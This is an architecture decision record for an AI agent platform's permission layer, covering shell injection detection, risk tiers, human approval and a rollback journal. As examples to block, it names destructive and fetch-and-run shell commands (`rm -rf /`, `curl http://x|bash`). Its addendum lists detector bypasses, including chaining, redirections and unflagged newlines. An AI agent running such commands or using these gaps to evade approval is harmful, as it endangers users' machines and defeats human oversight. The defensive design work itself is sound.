# ADR-015: Permission and tool governance

- Status: Accepted
- Date: 2026-06-04

## Context

Agents in Apollia run shell commands, touch the filesystem, and call native and
MCP tools. A binary `dangerous: bool` flag on a tool descriptor is not enough to
govern this surface. Shell tools can run arbitrarily destructive commands
(`rm -rf /`, `curl | bash`, argument injection). Filesystem tools can read and
write anywhere on the machine. Tool credentials (search API keys, HTTP tokens)
had no official home and were read ad hoc from the environment. Permission rules,
their audit trail, tool enable state, and credentials were scattered across
disjoint stores.

Apollia positions itself on autonomous agents regulated by human-in-the-loop, not
on a hard sandbox. An agent must be able to reach any file on the machine: what
varies is the friction (how many clicks to authorize) and the reversibility (can
it be undone), not the reach. The governance layer has to express that doctrine
in one coherent mechanism and keep a single source of truth.

## Decision

We adopt a unified permission and tool governance layer backed by a single SQLite
database, `~/.apollia/governance.db`, that is the only runtime source of decision.

### Cascading permission engine

Every shell command flows through three layers, deny by default:

1. InjectionDetector: a structural shell-string scan, evaluated first with
   absolute priority. It is quote-aware (single and double quote tracking) and
   uses `shell_words` tokenization to block command substitution (`$()` and
   backtick), process substitution (`>()` and `<()`), pipe-to-interpreter, and
   unsafe `eval` of an unquoted variable.
2. SafeList: an allow list of commands, empty by default.
3. PrefixRuleEngine: the SQLite-backed rule layer, evaluating session, then
   project, then global rules and keeping the longest matching prefix. A command
   that matches no rule falls back to `NeedsApproval`.

Separate from this engine, a `RiskClassifier` (in `apollia-tools`, alongside the
bash validator) is a stateless, I/O-free classification into Safe, Low, Medium,
High, Critical based on semantic patterns (not a hardcoded banned list, which is
unmaintainable and bypassable via aliases or encoding). It is not a cascade
layer: it feeds the HITL friction tiers below.

The classifier is generalized to filesystem operations as well. Reading inside a
project workspace is Safe, writing inside is Low, reading outside is Low, writing
outside is Medium, writing to system paths (`/etc`, `/usr`, `~/.ssh`) or
destructive operations (`rm -rf`, `chmod`, `chown`) is High. Reading sensitive
dotfiles stays Safe or Low: a legitimate agent must read `~/.ssh/config` without
friction.

### Graduated friction

The classification maps to graduated HITL: Safe auto-approves silently, Low
auto-approves with a cancellable toast, Medium requires explicit approval with a
diff preview, High adds a preview and disables "always allow" for the session, and
Critical adds a secondary confirmation. Operators can lower the friction (trust
profile) or raise it (paranoid profile).

### Reversible journal

Before every native filesystem mutation, a journal entry capturing the previous
content and metadata is written under `~/.apollia/journal/<session-id>/`. The user
can undo via `apollia rollback <session>` or the desktop timeline. The journal
covers native filesystem tools, where Apollia controls the full mutation code; it
does not cover `bash_executor`, where an arbitrary `curl | bash` cannot be
inverted and the cascading engine remains the guard.

### Single governance database

`governance.db` holds the permission rules, an immutable append-only audit log,
the enabled or disabled state of every native tool, and tool credentials. Tools
can be enabled or disabled at runtime without recompiling: `build_native_dispatcher`
consults the tool registry at startup and a tool absent from the table stays active
by default. Credentials are encrypted with AES-256-GCM, the 32-byte master key
living in `~/.apollia/.keyfile` (mode `0600`). Four HITL scopes are propagated
faithfully from the UI to the engine: `session` (in memory, never persisted),
`project` (persisted and filtered by canonical project path), `agent`, and
`global`. The `permission_rule_add` tool accepts `global`, `project`, and `agent`;
`session` rules are RAM-only and added through the desktop "Always allow for this
session" path. Rules are evaluated session then project then global, keeping the
longest matching prefix.

### Agent-driven rule authoring

There is no Rust derivation engine that turns the user profile into rules silently;
that would violate principle #6. Instead, three native tools,
`permission_rule_add`, `permission_rule_remove`, and `permission_rule_list`, let an
agent propose, inspect, or revoke rules. Writes are always HITL-gated. Every rule
carries a `created_by` field (`onboarding-agent`, `user-hitl`, `user-settings`,
`config-import`) for audit. The onboarding agent reads the collected profile,
proposes the matching rules conversationally, and the user confirms each through
the standard approval surface.

## Alternatives considered

### Hardcoded banned command list (rejected)
- Pros: trivial to start.
- Cons: not configurable, never complete, bypassable via aliases or unicode encoding.

### Hard sandbox forbidding absolute paths (rejected)
- Pros: zero work, blunt path-traversal protection.
- Cons: contradicts the autonomous-agent doctrine, blocks legitimate use, adds
  nothing over the OS access controls on a developer machine.

### Multiple stores for rules, audit, tool state, and credentials (rejected)
- Pros: isolation by responsibility.
- Cons: multiple configuration and backup paths, no transactional consistency
  between a rule and its audit entry, no single mental model.

### Rust derivation engine from profile to rules (rejected)
- Pros: deterministic, zero LLM turn.
- Cons: turns user memory into an invisible runtime side effect (violates
  principle #6) and requires extending the engine for a behavior nobody asked for.

### Chosen: cascading engine, graduated friction, journal, single governance database, agent-driven rules
- Pros: one source of truth, predictable HITL semantics, reach unrestricted while
  friction and reversibility are graduated, every rule traceable to its author.
- Trade-offs: the `.keyfile` is a sensitive file whose loss makes credentials
  unrecoverable, and the journal adds a disk write before each mutation.

## Consequences

- Positive: agents can read, list, and write anywhere subject to HITL on risky
  cases; the user can undo any native mutation; `governance.db` is the single
  audited runtime source; any agent can propose domain-specific rules through the
  same path the UI and CLI use.
- Negative / trade-off: AES-256-GCM with a local key is weaker than an OS keyring
  against an attacker with a shell; the journal has a measurable disk cost on
  intensive write sessions.
- Watch: audit log volume (append-only, plan a retention job past a few hundred MB);
  HITL responsiveness on long chains of filesystem operations (batch or
  per-pattern "always allow").

## Architectural principles

- Principle #4 (Fail fast): Critical commands are rejected before execution; the
  classifier is synchronous and stateless.
- Principle #5 (One actor, one responsibility): the journal writer, the HITL broker,
  the tool registry, the credential store, and the rule engine each own their state
  and their own SQLite connection.
- Principle #6 (Memory at agent initiative): the profile is a conversational input
  for the agent that proposes, never an automatic runtime effect.
- Principle #7 (Non-negotiable safeguards): SQLite triggers make the audit log
  append-only at the engine level; every rule write and risky action passes
  through HITL with no agent-side bypass; the journal is written before any mutation.

## Related

- [ADR-006](ADR-006-tool-subsystem.md) defines the tool subsystem and native tools this layer governs.
- [ADR-013](ADR-013-human-in-the-loop.md) defines the HITL approval mechanism the friction tiers drive.

## Addendum: shell control-operator hardening (2026-07-20)

A pre-launch security review confirmed the InjectionDetector was bypassable: it
scanned for command and process substitution, pipe-to-interpreter, and unsafe
`eval`, but ignored command chaining (`;`, `&&`, `||`) and redirections (`>`,
`>>`, `<`, `2>`, `&>`). A glued `curl http://x|bash` (no space around the pipe)
also slipped through the tokenizer.

The detector now also blocks command chaining and redirections, and catches the
pipe-to-interpreter case whether the pipe is spaced, glued, or targets an
interpreter by absolute path. The `shell_words` tokenizer is replaced by a
single quote-aware byte scanner: it is the only reliable way to distinguish a
real `curl|bash` from a literal `echo 'x|bash'`, because tokenization discards
the quoting context. Single and double quote tracking is preserved.

A bare newline as a command separator is intentionally still not flagged. Layer
3 is a hard deny with no approval path, and it runs on every string argument of
every tool, so rejecting newlines would block legitimate multi-line content.
Scoping this barrier to command-executing tools (or a parsed argv) is the
follow-up that would let newline detection be added safely.
